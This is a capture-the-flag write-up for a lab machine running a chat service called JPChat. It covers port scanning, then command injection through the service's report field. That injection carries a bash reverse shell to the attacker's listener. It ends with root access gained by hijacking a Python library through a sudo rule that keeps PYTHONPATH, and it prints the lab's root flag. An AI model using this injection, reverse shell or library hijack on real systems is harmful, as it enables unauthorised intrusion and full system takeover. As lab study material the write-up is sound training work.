# IP
10.10.252.69

## Enumeration
### Nmap
Found 2 ports running on the machine

```console
❯ nmap -sC -sV  -p- -vvv 10.10.252.69 --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-08 13:46 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:46
Completed NSE at 13:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:46
Completed NSE at 13:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:46
Completed NSE at 13:46, 0.00s elapsed
Initiating Ping Scan at 13:46
Scanning 10.10.252.69 [2 ports]
Completed Ping Scan at 13:46, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:46
Completed Parallel DNS resolution of 1 host. at 13:46, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:46
Scanning 10.10.252.69 [65535 ports]
Discovered open port 22/tcp on 10.10.252.69
Connect Scan Timing: About 31.86% done; ETC: 13:48 (0:01:06 remaining)
Connect Scan Timing: About 62.63% done; ETC: 13:48 (0:00:36 remaining)
Completed Connect Scan at 13:48, 99.72s elapsed (65535 total ports)
Initiating Service scan at 13:48
Scanning 1 service on 10.10.252.69
Completed Service scan at 13:48, 0.40s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.252.69.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 4.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 0.00s elapsed
Nmap scan report for 10.10.252.69
Host is up, received conn-refused (0.14s latency).
Scanned at 2022-11-08 13:46:50 IST for 104s
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqRxJhw/1rrvXuEkXF+agfTYMZrCisS01Z9EWAv8j6Cxjd00jBeaTGD/OsyuWUGwIqC0duALIIccwQfG2DjyrJCIPYyXyRiTbTSbqe07wX6qnnxV4xBmKdu8SxVlPKqVN36gQtbHWQqk9M45sej0M3Qz2q5ucrQVgWsjxYflYI1GZg7DSuWbI9/GNJPugt96uxupK0pJiJXNG26sM+w0BdF/DHlWFxG0Z+2CMqSlNt4EA2hlgBWKzGxvKbznJsapdtrAvKxBF6WOfz/FdLMQa7f28UOSs2NnUDrpz8Xhdqz2fj8RiV+gnywm8rkIzT8FOcMTGfsvOHoR8lVFvp5mj
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2CCqg8ac3eDsePDO27TM9OweWbaqytzrMyj+RbwDCHaAmfvhbA0CqTGdTIBAsVG6ect+OlqwgOvmTewS9ihB8=
|   256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXcEOgRyLk02uwr8mYrmAmFsUGPSUw1MHEDeH5qmcxv
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:48
Completed NSE at 13:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.38 seconds
```

### Application(port:3000)
- Connected to the machine with netcat on port  3000

```console
❯ nc 10.10.252.69 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

- It says to see source code at the admin's github.
- Found the source code [here](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py)
- We can escape code with `;` which we use in bash to start new commands 

## Exploitation

### Application(port:3000)
- Started netcat listener and injected code on the application

```console
❯ nc 10.10.252.69 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
random
your report:
; bash -i >& /dev/tcp/10.17.0.215/4444 0>&1;
```

- Got a reverse shell.

```console
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.252.69] 58846
bash: cannot set terminal process group (1557): Inappropriate ioctl for device
bash: no job control in this shell
ls
ls
bin
boot
box_setup
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
cd /home/wes
cd /home/wes
cd .ssh
cd .ssh
bash: cd: .ssh: No such file or directory
ls
ls
user.txt
```
- Found user text

### Privilege Escalation
- Checked commands allowed to wes to run as root on this machine

```console
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
- No broken paths
- We don't have write access on `/opt/development/test_module.py` 

```console
ls -l /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15  2021 /opt/development/test_module.py
```
- But see to run import a library as root, it sets path to search libraries `mail_badpass, env_keep+=PYTHONPATH`, we can use [this](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) exploit.
- Let's see the source code 

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```
- It is importing a library named compare searched for a file name `compare.py`.

```console
find / -name "compare.py" 2>/dev/null
/usr/lib/python3.5/compare.py
```

- Made a file named `compare.py` in `/tmp` with source code.

```python
class compare:

	def Str(self, x, y,):
		x = str(x)
		y = str(y)

		if x == y:
			return True;
		else:
			return False;

	def Int(self, x, y,):
		x = int(x)
		y = int(y)

		if x == y:
			return True;
		else:
			return True;

	def Float(self, x, y,):
		x = float(x)
		y = float(y)

		if x == y:
			return True;
		else:
			return False;
```
- If we will see source code of `/opt/development/test_module.py`, all the data is in string type, and "hello"=="hello".
- Added os code in `Str` function under `if x==y` 

```python
import os
class compare:

	def Str(self, x, y,):
		x = str(x)
		y = str(y)

		if x == y:
      os.system("bash -p")
			return True;
		else:
			return False;

	def Int(self, x, y,):
		x = int(x)
		y = int(y)

		if x == y:
			return True;
		else:
			return True;

	def Float(self, x, y,):
		x = float(x)
		y = float(y)

		if x == y:
			return True;
		else:
			return False;

```
- Started the python file with PYTHONENV as /tmp.

```console
 sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
<o PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
whoami
root
cd /root
ls
root.txt
cat root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF

```
